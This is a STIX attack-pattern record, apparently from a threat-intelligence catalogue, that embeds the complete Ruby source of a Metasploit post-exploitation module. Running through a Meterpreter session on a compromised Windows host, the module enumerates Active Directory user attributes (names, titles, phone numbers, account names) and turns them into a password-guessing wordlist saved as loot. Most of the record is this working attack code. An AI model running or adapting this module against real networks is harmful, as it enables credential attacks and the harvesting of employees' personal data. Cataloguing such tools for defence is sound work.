{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--91111512-ee13-4995-8e95-c853f06f6dbe",
    "created": "2024-08-14T16:33:05.052644Z",
    "modified": "2024-08-14T16:33:05.052648Z",
    "name": "Windows Active Directory Wordlist Builder",
    "description": " This module will gather information from the default Active Domain (AD) directory and use these words to seed a wordlist. By default it enumerates user accounts to build the wordlist.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_ad_to_wordlist.rb",
            "external_id": "enum_ad_to_wordlist.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::LDAP\n\n  DEFAULT_FIELDS = [\n    'sn',\n    'givenName',\n    'state',\n    'postalCode',\n    'physicalDeliveryOfficeName',\n    'telephoneNumber',\n    'mobile',\n    'facsimileTelephoneNumber',\n    'displayName',\n    'title',\n    'department',\n    'company',\n    'streetAddress',\n    'sAMAccountName',\n    'comment',\n    'description'\n  ]\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Active Directory Wordlist Builder',\n        'Description' => %q{\n          This module will gather information from the default Active Domain (AD) directory\n          and use these words to seed a wordlist. By default it enumerates user accounts to\n          build the wordlist.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Thomas Ring'],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter']\n      )\n    )\n\n    register_options([\n      OptString.new('FIELDS', [true, 'Fields to retrieve (ie, sn, givenName, displayName, description, comment)', DEFAULT_FIELDS.join(',')]),\n      OptString.new('FILTER', [true, 'Search filter.', '(&(objectClass=organizationalPerson)(objectClass=user)(objectClass=person)(!(objectClass=computer)))'])\n    ])\n  end\n\n  def run\n    fields = datastore['FIELDS'].gsub(/\\s+/, '').split(',')\n    search_filter = datastore['FILTER']\n    q = nil\n\n    begin\n      q = query(search_filter, datastore['MAX_SEARCH'], fields)\n    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e\n      # Can't bind or in a network w/ limited accounts\n      print_error(e.message)\n      return\n    end\n\n    return if q.nil? || q[:results].empty?\n\n    @words_dict = {}\n    q[:results].each do |result|\n      result.each do |field|\n        search_words(field[:value])\n      end\n    end\n\n    # build array of words to output sorted on frequency\n    ordered_dict = @words_dict.sort_by { |_k, v| v }.reverse\n    ordered_dict.collect! { |k, _v| k }\n\n    if ordered_dict.blank?\n      print_error('The wordlist is empty')\n      return\n    end\n\n    print_good(\"Wordlist with #{ordered_dict.length} entries built\")\n    stored_path = store_loot('ad.wordlist', 'text/plain', session, ordered_dict.join(\"\\n\"))\n    print_good(\"Results saved to: #{stored_path}\")\n  end\n\n  def search_words(field)\n    return if field.blank?\n    return if field =~ /^\\s*$/ || field.length < 3\n\n    field.gsub!(/[()\"]/, '') # clear up common punctuation in descriptions\n    field.downcase!             # clear up case\n\n    words = field.split(%r{\\s+|=|/|,|\\+})\n    return if words.empty?\n\n    words.each do |word|\n      next if word.length < 3 || word.length > 24\n\n      if @words_dict[word]\n        @words_dict[word] += 1\n      else\n        @words_dict[word] = 1\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}